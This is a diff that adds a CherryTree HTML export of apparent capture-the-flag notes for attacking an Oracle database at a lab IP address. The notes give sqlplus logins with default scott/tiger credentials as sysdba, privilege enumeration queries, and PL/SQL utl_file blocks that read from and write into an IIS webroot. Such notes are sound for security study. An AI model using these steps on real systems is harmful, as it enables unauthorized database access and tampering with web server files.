@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>sql</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>sql</h1><br/>login--<br />sqlplus64 scott/tiger@10.10.10.82:1521/XE<br />sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba         &lt;to login as sysdba<br /><br />show privs--<br />select * from session_privs;             To show privledge<br />select * from user_role_privs;<br /><br />turn on screen output--<br />set serveroutput ON<br /><br />short script to read files--<br />declare<br />    f utl_file.file_type;<br />    s varchar(200);<br />begin<br />    f := utl_file.fopen(&#39;/inetpub/wwwroot&#39;, &#39;iisstart.htm&#39;, &#39;r&#39;);<br />    utl_file.get_line(f,s);<br />    utl_file.fclose(f);<br />    dbms_output.put_line(s);<br />end;<br />/<br /><br />short script to write files--<br />declare<br />    f utl_file.file_type;<br />    s varchar(5000) := &#39;yeet&#39;;<br />begin<br />    f := utl_file.fopen(&#39;/inetpub/wwwroot&#39;, &#39;cannon.txt&#39;, &#39;w&#39;);<br />    utl_file.put_line(f,s);<br />    utl_file.fclose(f);<br />end;<br />/</div></body></html>
